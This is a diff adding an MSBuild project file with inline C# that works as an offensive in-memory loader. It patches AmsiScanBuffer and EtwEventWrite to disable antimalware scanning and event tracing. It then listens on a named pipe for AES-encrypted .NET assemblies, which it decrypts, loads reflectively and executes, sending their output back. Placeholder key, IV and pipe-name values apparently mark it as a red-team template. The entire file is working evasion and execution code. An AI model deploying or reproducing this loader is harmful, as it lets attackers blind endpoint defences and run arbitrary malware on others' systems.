@@ -1,0 +1,273 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Execute">
+    <PipeListener />
+  </Target>
+  <UsingTask
+    TaskName="PipeListener"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Reference Include="System" />
+      <Reference Include="System.Core" />
+      <Reference Include="System.Runtime.InteropServices" />
+      <Using Namespace="System" />
+      <Using Namespace="System.IO" />
+      <Using Namespace="System.IO.Pipes" />
+      <Using Namespace="System.Reflection" />
+      <Using Namespace="System.Runtime.InteropServices" />
+      <Using Namespace="System.Security.Cryptography" />
+      <Code Type="Class" Language="cs">
+<![CDATA[
+using System;
+using System.IO;
+using System.IO.Pipes;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+
+public class PipeListener : Task
+{
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
+    static extern IntPtr LoadLibrary(string lpFileName);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
+    static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("kernel32.dll")]
+    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
+        uint flNewProtect, out uint lpflOldProtect);
+
+    const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+    static bool PatchAmsi()
+    {
+        try
+        {
+            IntPtr hAmsi = LoadLibrary("amsi.dll");
+            if (hAmsi == IntPtr.Zero) return false;
+            IntPtr addr = GetProcAddress(hAmsi, "AmsiScanBuffer");
+            if (addr == IntPtr.Zero) return false;
+            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            uint oldProtect;
+            VirtualProtect(addr, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
+            Marshal.Copy(patch, 0, addr, patch.Length);
+            uint tmp;
+            VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out tmp);
+            return true;
+        }
+        catch { return false; }
+    }
+
+    static bool PatchEtw()
+    {
+        try
+        {
+            IntPtr hNtdll = GetModuleHandle("ntdll.dll");
+            if (hNtdll == IntPtr.Zero) return false;
+            IntPtr addr = GetProcAddress(hNtdll, "EtwEventWrite");
+            if (addr == IntPtr.Zero) return false;
+            byte[] patch = { 0x33, 0xC0, 0xC3 };
+            uint oldProtect;
+            VirtualProtect(addr, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
+            Marshal.Copy(patch, 0, addr, patch.Length);
+            uint tmp;
+            VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out tmp);
+            return true;
+        }
+        catch { return false; }
+    }
+
+    static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv)
+    {
+        using (RijndaelManaged aes = new RijndaelManaged())
+        {
+            aes.Key = key;
+            aes.IV = iv;
+            aes.Mode = CipherMode.CBC;
+            aes.Padding = PaddingMode.PKCS7;
+            ICryptoTransform decryptor = aes.CreateDecryptor();
+            return decryptor.TransformFinalBlock(data, 0, data.Length);
+        }
+    }
+
+    static string PIPE_NAME = "YOURPIPENAMEHERE";
+    static string KEY_B64 = "YOURKEYHERE";
+    static string IV_B64 = "YOURIVHERE";
+
+    static void ReadExact(Stream s, byte[] buf, int offset, int count)
+    {
+        int total = 0;
+        while (total < count)
+        {
+            int read = s.Read(buf, offset + total, count - total);
+            if (read == 0) throw new EndOfStreamException();
+            total += read;
+        }
+    }
+
+    static int ReadInt32(Stream s)
+    {
+        byte[] buf = new byte[4];
+        ReadExact(s, buf, 0, 4);
+        return BitConverter.ToInt32(buf, 0);
+    }
+
+    static string ReadString(Stream s)
+    {
+        int len = ReadInt32(s);
+        if (len == 0) return "";
+        byte[] buf = new byte[len];
+        ReadExact(s, buf, 0, len);
+        return Encoding.UTF8.GetString(buf);
+    }
+
+    static void WriteInt32(Stream s, int val)
+    {
+        s.Write(BitConverter.GetBytes(val), 0, 4);
+    }
+
+    static void WriteString(Stream s, string val)
+    {
+        byte[] data = Encoding.UTF8.GetBytes(val);
+        WriteInt32(s, data.Length);
+        s.Write(data, 0, data.Length);
+    }
+
+    static void InvokeMethod(MethodInfo method, object instance, string[] args)
+    {
+        ParameterInfo[] parms = method.GetParameters();
+        if (parms.Length == 0)
+            method.Invoke(instance, null);
+        else if (parms.Length == 1 && parms[0].ParameterType == typeof(string[]))
+            method.Invoke(instance, new object[] { args });
+        else
+            method.Invoke(instance, null);
+    }
+
+    public override bool Execute()
+    {
+        PatchEtw();
+        PatchAmsi();
+
+        byte[] key = Convert.FromBase64String(KEY_B64);
+        byte[] iv = Convert.FromBase64String(IV_B64);
+
+        while (true)
+        {
+            try
+            {
+                using (var pipe = new NamedPipeServerStream(PIPE_NAME,
+                    PipeDirection.InOut, 1, PipeTransmissionMode.Byte))
+                {
+                    pipe.WaitForConnection();
+
+                    int assemblyLen = ReadInt32(pipe);
+                    if (assemblyLen == 0) break;
+
+                    byte[] encrypted = new byte[assemblyLen];
+                    ReadExact(pipe, encrypted, 0, assemblyLen);
+
+                    int argCount = ReadInt32(pipe);
+                    string[] args = new string[argCount];
+                    for (int i = 0; i < argCount; i++)
+                        args[i] = ReadString(pipe);
+
+                    string typeName = ReadString(pipe);
+                    string methodName = ReadString(pipe);
+
+                    byte[] clearAssembly;
+                    try
+                    {
+                        clearAssembly = AesDecrypt(encrypted, key, iv);
+                    }
+                    catch (CryptographicException)
+                    {
+                        WriteString(pipe, "[-] Decryption failed -- wrong key?\n");
+                        WriteInt32(pipe, 1);
+                        continue;
+                    }
+                    Array.Clear(encrypted, 0, encrypted.Length);
+
+                    TextWriter origOut = Console.Out;
+                    TextWriter origErr = Console.Error;
+                    int exitCode = 0;
+                    string output;
+
+                    using (var sw = new StringWriter())
+                    {
+                        Console.SetOut(sw);
+                        Console.SetError(sw);
+
+                        try
+                        {
+                            Assembly asm = Assembly.Load(clearAssembly);
+
+                            if (typeName.Length > 0 && methodName.Length > 0)
+                            {
+                                Type t = asm.GetType(typeName);
+                                if (t == null)
+                                    throw new Exception("Type not found: " + typeName);
+
+                                BindingFlags flags = BindingFlags.Public | BindingFlags.NonPublic
+                                    | BindingFlags.Static | BindingFlags.Instance;
+                                MethodInfo method = t.GetMethod(methodName, flags);
+                                if (method == null)
+                                    throw new Exception("Method not found: " + typeName + "." + methodName);
+
+                                if (method.IsStatic)
+                                    InvokeMethod(method, null, args);
+                                else
+                                {
+                                    object instance = Activator.CreateInstance(t);
+                                    InvokeMethod(method, instance, args);
+                                }
+                            }
+                            else
+                            {
+                                MethodInfo entry = asm.EntryPoint;
+                                if (entry != null)
+                                    InvokeMethod(entry, null, args);
+                            }
+                        }
+                        catch (TargetInvocationException ex)
+                        {
+                            Console.Error.WriteLine(ex.InnerException != null
+                                ? ex.InnerException.ToString() : ex.ToString());
+                            exitCode = 1;
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.Error.WriteLine(ex.ToString());
+                            exitCode = 1;
+                        }
+
+                        Console.SetOut(origOut);
+                        Console.SetError(origErr);
+                        output = sw.ToString();
+                    }
+
+                    Array.Clear(clearAssembly, 0, clearAssembly.Length);
+                    WriteString(pipe, output);
+                    WriteInt32(pipe, exitCode);
+                }
+            }
+            catch { }
+        }
+
+        Array.Clear(key, 0, key.Length);
+        Array.Clear(iv, 0, iv.Length);
+        return true;
+    }
+}
+]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
